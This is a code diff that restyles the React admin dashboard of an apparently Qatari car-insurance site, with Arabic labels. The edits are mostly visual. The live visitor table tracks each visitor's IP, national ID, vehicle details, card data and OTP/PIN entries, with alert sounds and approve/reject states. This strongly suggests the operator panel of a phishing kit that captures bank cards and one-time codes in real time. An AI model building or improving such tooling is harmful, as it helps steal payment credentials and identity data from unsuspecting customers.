@@ -3,7 +3,7 @@ import { useNavigate } from 'react-router-dom';
 import { 
   LogOut, Search, Eye, RefreshCw, Users, CreditCard, 
   Shield, Clock, CheckCircle, XCircle, AlertCircle, Activity,
-  DollarSign, Phone, Car, Navigation, Calendar
+  DollarSign, Phone, Car, Navigation, Calendar, TrendingUp
 } from 'lucide-react';
 import { useSocket } from '../context/SocketContext';
 import { 
@@ -13,6 +13,7 @@ import {
   playOTPSound, 
   playPINSound 
 } from '../utils/notificationSounds';
+import '../styles/AdminDashboard.css';
 
 export default function AdminDashboard() {
   const navigate = useNavigate();
@@ -336,23 +337,30 @@ export default function AdminDashboard() {
 
   const getStatusBadge = (status) => {
     const styles = {
-      pending: 'bg-yellow-100 text-yellow-800 border-yellow-200',
-      approved: 'bg-green-100 text-green-800 border-green-200',
-      rejected: 'bg-red-100 text-red-800 border-red-200',
-      waiting: 'bg-blue-100 text-blue-800 border-blue-200'
+      pending: 'bg-gradient-to-r from-yellow-400 to-yellow-500 text-white shadow-lg shadow-yellow-400/50',
+      approved: 'bg-gradient-to-r from-green-500 to-emerald-600 text-white shadow-lg shadow-green-400/50',
+      rejected: 'bg-gradient-to-r from-red-500 to-rose-600 text-white shadow-lg shadow-red-400/50',
+      waiting: 'bg-gradient-to-r from-blue-500 to-cyan-600 text-white shadow-lg shadow-blue-400/50'
     };
 
     const icons = {
-      pending: <Clock className="w-3 h-3" />,
-      approved: <CheckCircle className="w-3 h-3" />,
-      rejected: <XCircle className="w-3 h-3" />,
-      waiting: <AlertCircle className="w-3 h-3" />
+      pending: <Clock className="w-3.5 h-3.5" />,
+      approved: <CheckCircle className="w-3.5 h-3.5" />,
+      rejected: <XCircle className="w-3.5 h-3.5" />,
+      waiting: <AlertCircle className="w-3.5 h-3.5" />
+    };
+
+    const labels = {
+      pending: 'قيد الانتظار',
+      approved: 'مو افق عليه',
+      rejected: 'مرفوض',
+      waiting: 'انتظار'
     };
 
     return (
-      <span className={`inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-semibold border ${styles[status] || styles.pending}`}>
+      <span className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-bold transition-all hover:scale-105 ${styles[status] || styles.pending}`}>
         {icons[status]}
-        {status.toUpperCase()}
+        {labels[status] || status.toUpperCase()}
       </span>
     );
   };
@@ -885,50 +893,90 @@ export default function AdminDashboard() {
 
         {/* Stats Cards */}
         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-          <div className="bg-white rounded-2xl p-6 shadow-lg hover:shadow-2xl transition-all duration-300 border-l-4 border-blue-500 hover:scale-105">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-gray-600 text-sm mb-1">إجمالي العملاء</p>
-                <p className="text-3xl font-bold text-blue-600">{stats.total}</p>
+          <div className="stat-card bg-gradient-to-br from-blue-500 via-blue-600 to-blue-700 text-white rounded-2xl p-6 shadow-xl hover:shadow-2xl transition-all duration-300 border border-blue-400/20 relative overflow-hidden group">
+            <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 group-hover:scale-150 transition-transform duration-500"></div>
+            <div className="relative z-10">
+              <div className="flex items-center justify-between mb-3">
+                <div className="w-14 h-14 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center group-hover:rotate-12 transition-transform duration-300">
+                  <Users className="w-7 h-7" />
+                </div>
+                <div className="bg-white/20 backdrop-blur-sm px-3 py-1 rounded-full text-xs font-bold">
+                  {((stats.total / 100) * 100).toFixed(0)}%
+                </div>
               </div>
-              <div className="bg-blue-100 p-3 rounded-lg">
-                <Users className="w-8 h-8 text-blue-600" />
+              <div>
+                <p className="text-blue-100 text-sm mb-1 font-medium">إجمالي العملاء</p>
+                <p className="text-4xl font-bold">{stats.total}</p>
+                <p className="text-blue-200 text-xs mt-2 flex items-center gap-1">
+                  <Activity className="w-3 h-3" />
+                  جميع المستخدمين
+                </p>
               </div>
             </div>
           </div>
 
-          <div className="bg-white rounded-2xl p-6 shadow-lg hover:shadow-2xl transition-all duration-300 border-l-4 border-green-500 hover:scale-105">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-gray-600 text-sm mb-1">العملاء النشطون</p>
-                <p className="text-3xl font-bold text-green-600">{stats.active}</p>
+          <div className="stat-card bg-gradient-to-br from-green-500 via-emerald-600 to-green-700 text-white rounded-2xl p-6 shadow-xl hover:shadow-2xl transition-all duration-300 border border-green-400/20 relative overflow-hidden group">
+            <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 group-hover:scale-150 transition-transform duration-500"></div>
+            <div className="relative z-10">
+              <div className="flex items-center justify-between mb-3">
+                <div className="w-14 h-14 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center group-hover:rotate-12 transition-transform duration-300">
+                  <Activity className="w-7 h-7 animate-pulse" />
+                </div>
+                <div className="bg-white/20 backdrop-blur-sm px-3 py-1 rounded-full text-xs font-bold pulse-notification">
+                  LIVE
+                </div>
               </div>
-              <div className="bg-green-100 p-3 rounded-lg">
-                <Activity className="w-8 h-8 text-green-600" />
+              <div>
+                <p className="text-green-100 text-sm mb-1 font-medium">العملاء النشطون</p>
+                <p className="text-4xl font-bold">{stats.active}</p>
+                <p className="text-green-200 text-xs mt-2 flex items-center gap-1">
+                  <div className="w-2 h-2 bg-green-300 rounded-full animate-ping"></div>
+                  متصلون الآن
+                </p>
               </div>
             </div>
           </div>
 
-          <div className="bg-white rounded-2xl p-6 shadow-lg hover:shadow-2xl transition-all duration-300 border-l-4 border-yellow-500 hover:scale-105">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-gray-600 text-sm mb-1">قيد الانتظار</p>
-                <p className="text-3xl font-bold text-yellow-600">{stats.pending}</p>
+          <div className="stat-card bg-gradient-to-br from-yellow-500 via-amber-600 to-yellow-700 text-white rounded-2xl p-6 shadow-xl hover:shadow-2xl transition-all duration-300 border border-yellow-400/20 relative overflow-hidden group">
+            <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 group-hover:scale-150 transition-transform duration-500"></div>
+            <div className="relative z-10">
+              <div className="flex items-center justify-between mb-3">
+                <div className="w-14 h-14 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center group-hover:rotate-12 transition-transform duration-300">
+                  <Clock className="w-7 h-7" />
+                </div>
+                <div className="bg-white/20 backdrop-blur-sm px-3 py-1 rounded-full text-xs font-bold">
+                  {stats.total > 0 ? ((stats.pending / stats.total) * 100).toFixed(0) : 0}%
+                </div>
               </div>
-              <div className="bg-yellow-100 p-3 rounded-lg">
-                <Clock className="w-8 h-8 text-yellow-600" />
+              <div>
+                <p className="text-yellow-100 text-sm mb-1 font-medium">قيد الانتظار</p>
+                <p className="text-4xl font-bold">{stats.pending}</p>
+                <p className="text-yellow-200 text-xs mt-2 flex items-center gap-1">
+                  <Clock className="w-3 h-3" />
+                  يحتاج مراجعة
+                </p>
               </div>
             </div>
           </div>
 
-          <div className="bg-white rounded-2xl p-6 shadow-lg hover:shadow-2xl transition-all duration-300 border-l-4 border-purple-500 hover:scale-105">
-            <div className="flex items-center justify-between">
-              <div>
-                <p className="text-gray-600 text-sm mb-1">إجمالي الإيرادات</p>
-                <p className="text-3xl font-bold text-purple-600">{stats.totalRevenue.toFixed(0)} ر.ق</p>
+          <div className="stat-card bg-gradient-to-br from-purple-500 via-purple-600 to-indigo-700 text-white rounded-2xl p-6 shadow-xl hover:shadow-2xl transition-all duration-300 border border-purple-400/20 relative overflow-hidden group">
+            <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 group-hover:scale-150 transition-transform duration-500"></div>
+            <div className="relative z-10">
+              <div className="flex items-center justify-between mb-3">
+                <div className="w-14 h-14 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center group-hover:rotate-12 transition-transform duration-300">
+                  <DollarSign className="w-7 h-7" />
+                </div>
+                <div className="bg-white/20 backdrop-blur-sm px-3 py-1 rounded-full text-xs font-bold">
+                  QAR
+                </div>
               </div>
-              <div className="bg-purple-100 p-3 rounded-lg">
-                <DollarSign className="w-8 h-8 text-purple-600" />
+              <div>
+                <p className="text-purple-100 text-sm mb-1 font-medium">إجمالي الإيرادات</p>
+                <p className="text-4xl font-bold">{stats.totalRevenue.toLocaleString('ar-QA', { maximumFractionDigits: 0 })}</p>
+                <p className="text-purple-200 text-xs mt-2 flex items-center gap-1">
+                  <TrendingUp className="w-3 h-3" />
+                  ريال قطري
+                </p>
               </div>
             </div>
           </div>
@@ -995,23 +1043,108 @@ export default function AdminDashboard() {
         </div>
 
         {/* Customers Table */}
-        <div className="bg-white rounded-2xl shadow-2xl border border-gray-100">
-          <div className="overflow-x-auto">
-            <table className="w-full" dir="rtl">
-              <thead className="bg-gradient-to-r from-gray-900 via-gray-800 to-gray-900 text-white">
-                <tr>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">الحالة</th>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">IP</th>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">معلومات العميل</th>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">QID</th>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">السيارة</th>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">رقم اللوحة</th>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">التأمين</th>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">الصفحة الحالية</th>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">البطاقات</th>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">OTP/PIN</th>
-                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">الحالة</th>
-                  <th className="px-4 py-4 text-center text-xs font-bold whitespace-nowrap">الإجراءات</th>
+        <div className="bg-white rounded-2xl shadow-2xl border border-gray-100 overflow-hidden">
+          <div className="bg-gradient-to-r from-gray-900 via-gray-800 to-gray-900 px-6 py-4 border-b border-gray-700">
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 rounded-lg bg-white/10 flex items-center justify-center">
+                  <Users className="w-5 h-5 text-white" />
+                </div>
+                <div>
+                  <h3 className="text-white font-bold text-lg">قائمة العملاء المباشرة</h3>
+                  <p className="text-gray-400 text-xs">تحديث فوري كل 5 ثواني</p>
+                </div>
+              </div>
+              <div className="flex items-center gap-3">
+                <span className="bg-white/10 text-white px-3 py-1.5 rounded-lg text-sm font-semibold">
+                  {filteredCustomers.length} عميل
+                </span>
+              </div>
+            </div>
+          </div>
+
+          <div className="overflow-x-auto admin-table">
+            <table className="w-full" dir="rtl">\n              <thead className="bg-gradient-to-r from-gray-900 via-gray-800 to-gray-900 text-white sticky top-0 z-10">
+                <tr className="border-b border-gray-700">
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <Activity className="w-4 h-4" />
+                      الحالة
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                        <path fillRule="evenodd" d="M4.083 9h1.946c.089-1.546.383-2.97.837-4.118A6.004 6.004 0 004.083 9zM10 2a8 8 0 100 16 8 8 0 000-16zm0 2c-.076 0-.232.032-.465.262-.238.234-.497.623-.737 1.182-.389.907-.673 2.142-.766 3.556h3.936c-.093-1.414-.377-2.649-.766-3.556-.24-.56-.5-.948-.737-1.182C10.232 4.032 10.076 4 10 4zm3.971 5c-.089-1.546-.383-2.97-.837-4.118A6.004 6.004 0 0115.917 9h-1.946zm-2.003 2H8.032c.093 1.414.377 2.649.766 3.556.24.56.5.948.737 1.182.233.23.389.262.465.262.076 0 .232-.032.465-.262.238-.234.498-.623.737-1.182.389-.907.673-2.142.766-3.556zm1.166 4.118c.454-1.147.748-2.572.837-4.118h1.946a6.004 6.004 0 01-2.783 4.118zm-6.268 0C6.412 13.97 6.118 12.546 6.03 11H4.083a6.004 6.004 0 002.783 4.118z" clipRule="evenodd" />
+                      </svg>
+                      IP
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <Users className="w-4 h-4" />
+                      معلومات العميل
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                        <path fillRule="evenodd" d="M10 2a1 1 0 00-1 1v1a1 1 0 002 0V3a1 1 0 00-1-1zM4 4h3a3 3 0 006 0h3a2 2 0 012 2v9a2 2 0 01-2 2H4a2 2 0 01-2-2V6a2 2 0 012-2zm2.5 7a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm2.45 4a2.5 2.5 0 10-4.9 0h4.9zM12 9a1 1 0 100 2h3a1 1 0 100-2h-3zm-1 4a1 1 0 011-1h2a1 1 0 110 2h-2a1 1 0 01-1-1z" clipRule="evenodd" />
+                      </svg>
+                      QID
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <Car className="w-4 h-4" />
+                      السيارة
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                        <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
+                        <path fillRule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clipRule="evenodd" />
+                      </svg>
+                      رقم اللوحة
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <Shield className="w-4 h-4" />
+                      التأمين
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <Navigation className="w-4 h-4" />
+                      الصفحة الحالية
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <CreditCard className="w-4 h-4" />
+                      البطاقات
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <Shield className="w-4 h-4" />
+                      OTP/PIN
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center gap-2">
+                      <CheckCircle className="w-4 h-4" />
+                      الحالة
+                    </div>
+                  </th>
+                  <th className="px-4 py-4 text-center text-xs font-bold whitespace-nowrap uppercase tracking-wide">
+                    <div className="flex items-center justify-center gap-2">
+                      <Eye className="w-4 h-4" />
+                      الإجراءات
+                    </div>
+                  </th>
                 </tr>
               </thead>
               <tbody className="divide-y divide-gray-200">
@@ -1021,14 +1154,34 @@ export default function AdminDashboard() {
                   return (
                     <tr 
                       key={customer.ip} 
-                      className={`hover:bg-blue-50 transition-all duration-300 ${
-                        isNew ? 'blink-green-text' : ''
-                      } ${idx % 2 === 0 ? 'bg-white' : 'bg-gray-50/50'}`}
+                      className={`group transition-all duration-200 border-b border-gray-100 ${
+                        isNew ? 'animate-pulse bg-green-50' : ''
+                      } ${
+                        customer.isActive 
+                          ? 'bg-gradient-to-r from-green-50/30 via-white to-green-50/30 hover:from-green-100/40 hover:via-green-50/20 hover:to-green-100/40' 
+                          : idx % 2 === 0 
+                            ? 'bg-white hover:bg-gray-50' 
+                            : 'bg-gray-50/50 hover:bg-gray-100/50'
+                      } hover:shadow-md hover:scale-[1.01] cursor-pointer`}
+                      onClick={() => viewDetails(customer)}
                     >
                     <td className="px-4 py-4">
                       <div className="flex items-center gap-2">
-                        <div className={`w-3 h-3 rounded-full ${customer.isActive ? 'bg-green-500 animate-pulse shadow-lg shadow-green-300' : 'bg-gray-300'}`}></div>
-                        <span className="text-xs">{customer.isActive ? 'نشط' : 'غير متصل'}</span>
+                        <div className="relative">
+                          <div className={`w-3 h-3 rounded-full ${
+                            customer.isActive 
+                              ? 'bg-green-500 shadow-lg shadow-green-400/50' 
+                              : 'bg-gray-400'
+                          }`}></div>
+                          {customer.isActive && (
+                            <div className="absolute inset-0 w-3 h-3 rounded-full bg-green-500 animate-ping opacity-75"></div>
+                          )}
+                        </div>
+                        <span className={`text-xs font-semibold ${
+                          customer.isActive ? 'text-green-700' : 'text-gray-500'
+                        }`}>
+                          {customer.isActive ? 'نشط الآن' : 'غير متصل'}
+                        </span>
                       </div>
                     </td>
                     <td className="px-4 py-4">
@@ -1108,11 +1261,14 @@ export default function AdminDashboard() {
                     </td>
                     <td className="px-4 py-4">
                       <button
-                        onClick={() => viewDetails(customer)}
-                        className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white p-2 rounded-lg transition-all shadow-md hover:shadow-lg"
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          viewDetails(customer);
+                        }}
+                        className="bg-gradient-to-r from-blue-600 via-blue-700 to-indigo-600 hover:from-blue-700 hover:via-blue-800 hover:to-indigo-700 text-white p-2.5 rounded-xl transition-all shadow-lg hover:shadow-2xl hover:scale-110 active:scale-95 group-hover:shadow-blue-400/50"
                         title="عرض جميع التفاصيل"
                       >
-                        <Eye className="w-5 h-5" />
+                        <Eye className="w-5 h-5 transition-transform group-hover:rotate-12" />
                       </button>
                     </td>
                   </tr>
